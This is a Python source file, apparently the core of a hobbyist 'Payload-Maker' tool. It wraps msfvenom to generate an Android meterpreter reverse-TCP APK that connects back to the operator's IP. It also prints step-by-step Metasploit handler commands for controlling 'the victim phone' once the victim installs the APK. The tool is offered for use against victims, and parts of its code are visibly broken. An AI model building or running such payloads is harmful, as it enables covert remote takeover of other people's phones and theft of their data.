#Paycore v1.0
#it contain all the def functions for the source code
##############modules cheeker###########
class modules():
	#1-socket
	def socket_module_cheeke():
		try :
			import socket as socket
		except :
			import pip
			pip.main(["install", "socket"])
			import socket as socket
		#2-webbrowser
	def webbrowser_moudule_cheeker():
		try:
			from webbrowser import open
		except:
			import pip
			pip.main(["install","webbrowser"])
			from webbrowser import open
########importing the modules########

import os
import sys
import time
modules.socket_module_cheeke()
modules.webbrowser_moudule_cheeker()
from Payload import *
from core.banner import *
############getting the lhost#################
lhost = socket.gethostbyname(socket.gethostname())


############def functions#############



def restart_program():
	python = sys.executable
	os.execl(python, python, * sys.argv)
	curdir = os.getcwd()


def slowprint(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)



def paymak():
	os.system("clear")
	print("\033[36m==================[>>"+"\033[35m making the apk payload"+"\033[36m<<]==================")
	port = input("\033[36m ["+"\033[32m*"+"\033[36m]"+"\033[32m enter lport"+"\033[33m use 8080 it the best port "+"\033[32m : "+"\033[37m")
	if type(port == int):
		name = input("\033[36m ["+"\033[32m*"+"\033[36m]"+"\033[32m enter a name for the payload "+"\033[33m without "+"\033[36m("+"\033[34m .apk"+"\033[36m)"+"\033[32m : "+"\033[37m")
		os.system(f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT = {port} R > /sdcard/{name}.apk")
		print("\033[35m ["+"\033[32m*"+"\033[35m]"+"\033[36m DONE"+"\033[37m")
		time.sleep(2)
		os.system("clear")
		return start()
	
	else :
		print('he;;')
		time.sleep(4)
		os.system("clear")
		return paymak()


def command():
	os.system("clear")
	slowprint("\n\033[35m ["+"\033[32m*"+"\033[35m]"+"\033[36m after installing the apk payload in the victim phone "+"\033[37m")
	slowprint("\n\033[35m ["+"\033[32m*"+"\033[35m]"+"\033[36m you have to open the" +"\033[32m metasploit"+"\033[36m using the command"+"\033[35m msfconsole"+"\033[37m")
	slowprint("\n\033[35m ["+"\033[32m*"+"\033[35m]"+"\033[36m now type this commands"+"\033[37m")
	slowprint("\n\033[35m ["+"\033[32m*"+"\033[35m]"+"\033[35m use exploit/multi/handler"+"\033[37m")
	slowprint("\033[35m ["+"\033[32m*"+"\033[35m]"+"\033[35m set payload android/meterpreter/reverse_tcp"+"\033[37m")
	slowprint("\033[35m ["+"\033[32m*"+"\033[35m]"+"\033[35m set lhost"+"\033[33m with your ip : "+f"\033[36m {lhost}"+"\033[37m")
	slowprint("\033[35m ["+"\033[32m*"+"\033[35m]"+"\033[35m set lport"+"\033[33m the port you use when you make the payload"+"\033[37m")
	slowprint("\033[35m ["+"\033[32m*"+"\033[35m]"+"\033[35m exploit"+"\033[37m")
	slowprint("\n\033[35m ["+"\033[32m*"+"\033[35m]"+"\033[36m now you have to wait tell the victime open the apk payload "+"\033[37m")
	slowprint("\n\033[35m ["+"\033[32m*"+"\033[35m]"+"\033[36m after the victem open the payload type "+"\033[31mhelp"+"\033[36m to show what you can do with the victem phone "+"\033[37m")
	slowprint("\n\033[36m  ["+"\033[32m00"+"\033[36m]" +"\033[35m back to main menu ")
	x = input(" \033[36m  \n PaMake]=>> "+"\033[37m")
	if x == "00":
		os.system("clear")
		return payload()
	else:
	    print("\033[31m Wrong Input")
	    time.sleep(1)
	    os.system("clear")
	    return command()

def youtube():
	os.system("clear")
	print("\033[36m==================[>>"+"\033[32m the creator acounts"+"\033[36m<<]==================")
	print("\033[36m  ["+"\033[32m1"+"\033[36m]" +"\033[35m youtube")
	print("\033[36m  ["+"\033[32m2"+"\033[36m]" +"\033[35m Facebook ")
	print("\033[36m  ["+"\033[32m3"+"\033[36m]" +"\033[35m GitHub ")
	print("\033[36m  ["+"\033[32m00"+"\033[36m]" +"\033[35m back to main menu ")
	cha_cheeke = input(" \033[36m choose th acount that you want : " + "\033[37m")
	if cha_cheeke == "1" :
		os.system("clear")
		time.sleep(1)
		print("\033[36m==================[>>"+"\033[32m chossing the os"+"\033[36m<<]==================")
		print("\033[36m  ["+"\033[32m1"+"\033[36m]" +"\033[35m i'm usig termux")
		print("\033[36m  ["+"\033[32m2"+"\033[36m]" +"\033[35m i'm using a liux operating system")
		print("\033[36m  ["+"\033[32m3"+"\033[36m]" +"\033[35m i'm using window\mac operating system")
		print("\033[36m  ["+"\033[32m00"+"\033[36m]" +"\033[35m back to main menu")
		os_cheeke1 = input(" \033[36m  \n chosse one of operating system : "+"\033[37m")
		if os_cheeke1 == "1" :
			os.system("xdg-open https://www.youtube.com/channel/UCfD0KLgqBqvUzJsTGwqG1vQ")
		elif os_cheeke1 == "2":
			os.system("xdg-open https://www.youtube.com/channel/UCfD0KLgqBqvUzJsTGwqG1vQ")
		elif os_cheeke1 == "3":
			webbrowser.open("https://www.youtube.com/channel/UCfD0KLgqBqvUzJsTGwqG1vQ")
		elif os_cheeke1 == "00":
			return payload()
		else :
			print("\033[35m ["+"\033[31m?"+"\033[35m]"+"\033[31m Wrong Input the "+"\033[33m"+os_cheeke+"\033[31m it not found")
			time.sleep(1)
			os.system("clear")
			return youtube()
	if cha_cheeke == "2":
		os.system("clear")
		time.sleep(1)
		print("\033[36m==================[>>"+"\033[32m chossing the os"+"\033[36m<<]==================")
		print("\033[36m  ["+"\033[32m1"+"\033[36m]" +"\033[35m i'm usig termux")
		print("\033[36m  ["+"\033[32m2"+"\033[36m]" +"\033[35m i'm using a liux operating system")
		print("\033[36m  ["+"\033[32m3"+"\033[36m]" +"\033[35m i'm using window\mac operating system")
		print("\033[36m  ["+"\033[32m00"+"\033[36m]" +"\033[35m back to main menu")
		os_cheeke2 = input(" \033[36m  \n chosse one of operating system : "+"\033[37m")
		if os_cheeke2 == "1" :
			os.system("xdg-open https://www.facebook.com/Said_technologie-111339843954624/")
		elif os_cheeke2 == "2":
			os.system("xdg-open https://www.facebook.com/Said_technologie-111339843954624/")
		elif os_cheeke2 == "3":
			webbrowser.open("https://www.facebook.com/Said_technologie-111339843954624/")
		elif os_cheeke == "00":
			return payload()
		else :
			print("\033[35m ["+"\033[31m?"+"\033[35m]"+"\033[31m Wrong Input the "+"\033[33m"+os_cheeke2+"\033[31m it not found")
			time.sleep(1)
			os.system("clear")
			return youtube()
	if cha_cheeke == "3":
		os.system("clear")
		time.sleep(1)
		print("\033[36m==================[>>"+"\033[32m chossing the os"+"\033[36m<<]==================")
		print("\033[36m  ["+"\033[32m1"+"\033[36m]" +"\033[35m i'm usig termux")
		print("\033[36m  ["+"\033[32m2"+"\033[36m]" +"\033[35m i'm using a liux operating system")
		print("\033[36m  ["+"\033[32m3"+"\033[36m]" +"\033[35m i'm using window\mac operating system")
		print("\033[36m  ["+"\033[32m00"+"\033[36m]" +"\033[35m back to main menu")
		os_cheeke3 = input(" \033[36m  \n chosse one of operating system : "+"\033[37m")
		if os_cheeke3 == "1" :
			os.system("xdg-open https://github.com/said-technologie")
		elif os_cheeke3 == "2":
			os.system("xdg-open https://github.com/said-technologie")
		elif os_cheeke3 == "3":
			webbrowser.open("https://github.com/said-technologie")
		elif os_cheeke3 == "00":
			os.system("clear")
			return payload()
		else :
			print("\033[35m ["+"\033[31m?"+"\033[35m]"+"\033[31m Wrong Input the "+"\033[33m"+os_cheeke3+"\033[31m it not found")
			time.sleep(1)
			os.system("clear")
			return payload()
	elif cha_cheeke == "00":
		return payload()
	else :
		print("\033[35m ["+"\033[31m?"+"\033[35m]"+"\033[31m Wrong Input the "+"\033[33m"+cha_cheeke+"\033[31m it not found")
		time.sleep(2)
		return payload()

def start():
	os.system("clear")
	banner_front()
	while True :
		options_cheeker = input(" \033[36m  \n PaMake]=>> "+"\033[37m")
		if options_cheeker == "help":
			time.sleep(2)
			print("\033[33m       "+r"  command                                          description")
			print("\033[36m  "+r"      set payload                             use this command to creat a payload")
			print("\033[36m  "+r"     inject_apk                              use this command to inject a apk with a payload")
			print("\033[36m  "+r"     show options                    it will show you what you have to do after creating a payload")
			print("\033[36m  "+r"    show cre_chann                          it will show you all the creator of this script acount")
			print("\033[32m                     subscribe to my youtube channel please")
			print("\033[36m  "+r"        help                                     it will show you this help menu")
			print("\033[36m  "+r"        clear                                       it will clear the window")
			print("\033[36m  "+r"        exit                                       it will exit the programme")
		elif options_cheeker == "set payload":
			paymak()
		elif options_cheeker == "show options":
			command()
		elif options_cheeker == "show cre_chann":
			youtube()
		elif options_cheeker == "clear":
			os.system("clear")
		elif options_cheeker == "exit":
			print("\033[36m  ["+"\033[31m!"+"\033[36m]" +"\033[33m exiting...  "+"\033[37m")
			time.sleep(3)
			print("\033[36m  ["+"\033[32m+"+"\033[36m]"+"\033[32m Thanks for using Payload-Maker"+"\033[37m")
			sys.exit()
		else:
			print("\033[35m ["+"\033[31m?"+"\033[35m]"+"\033[31m Wrong Input the "+"\033[33m"+options_cheeker+"\033[31m it not found")
			print("\033[36m ["+"\033[32m+"+"\033[36m]"+"\033[35m try to type"+"\033[33m help "+"\033[35mto show the help menu")
			